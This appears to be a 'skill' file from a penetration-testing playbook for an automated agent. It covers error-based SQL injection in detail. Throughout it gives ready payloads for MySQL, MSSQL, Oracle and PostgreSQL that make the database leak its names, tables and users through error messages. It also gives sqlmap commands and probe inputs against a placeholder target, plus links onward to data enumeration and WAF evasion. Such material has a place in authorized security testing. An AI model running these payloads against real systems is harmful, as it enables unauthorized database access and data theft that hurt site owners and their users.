# Skill: Error-Based SQL Injection

## Metadata
- Phase: detection
- Techniques: E
- DB Targets: MySQL, MSSQL, Oracle, PostgreSQL
- Risk Level: low
- Prerequisites: application displays DB error messages

## When to Use

Use when the application **displays database error messages** in the HTTP response. Error-based injection forces the database to embed query results inside error messages, making it one of the fastest extraction methods.

Indicators:
- Error messages like: `You have an error in your SQL syntax`
- Stack traces showing database queries
- Error pages that include DB-specific error strings
- Custom error pages that still include raw error details

## How Error-Based Works

Injects database-specific functions that embed data into error messages:
```sql
-- MySQL: FLOOR + RAND
AND (SELECT 9285 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.TABLES GROUP BY x)a)

-- MSSQL: CONVERT
CONVERT(int, @@version)

-- PostgreSQL: CAST
CAST(version() AS INT)

-- Oracle: XMLType
AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))
```

## Minimum Viable Command

```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=E --batch
```

## Recommended Full Command

```bash
sqlmap -u "http://target.com/page.php?id=1" \
  --technique=E \
  --dbms=mysql \
  --batch \
  --level=1 \
  --risk=1 \
  --threads=5 \
  -v 2
```

## Manual Verification

Trigger errors deliberately:
```
?id=1'
?id=1"
?id=1')
?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--
```

Look for:
```
MySQL error: You have an error in your SQL syntax near "'" at line 1
MSSQL: Unclosed quotation mark after the character string
PostgreSQL: ERROR: unterminated quoted string
Oracle: ORA-00933: SQL command not properly ended
```

## Error-Based Payloads by DBMS

### MySQL (FLOOR/RAND method)
```sql
AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)

-- EXTRACTVALUE method (MySQL >= 5.1)
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))
```

### MSSQL
```sql
AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))
AND 1=(SELECT 1/0)
```

### Oracle
```sql
AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))
AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual)
```

### PostgreSQL
```sql
AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)
```

## Step-by-Step

1. Identify error messages in the application
2. Run detection command
3. Confirm error-based injection in output
4. Move directly to enumeration (fastest technique)

## Expected Output
```
[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
```

## Speed Comparison

Error-based is significantly faster than blind techniques:
- Extract DBMS version: ~5 seconds
- Extract DB name: ~5 seconds
- Dump 100-row table: ~10-30 seconds

## Red Flags (wrong skill)
- App has custom error handler (returns generic "error" page) -> try boolean-blind
- Error messages only appear in logs, not HTTP response -> use time-based or OOB

## Follow-Up
- Injection confirmed -> [Database Enumeration](../03_exploitation/database_enumeration.md)
- WAF blocking error payloads -> [WAF Evasion](../02_waf_evasion/tamper_selection_guide.md)
- Want even faster extraction -> check if UNION works too: `--technique=EU`
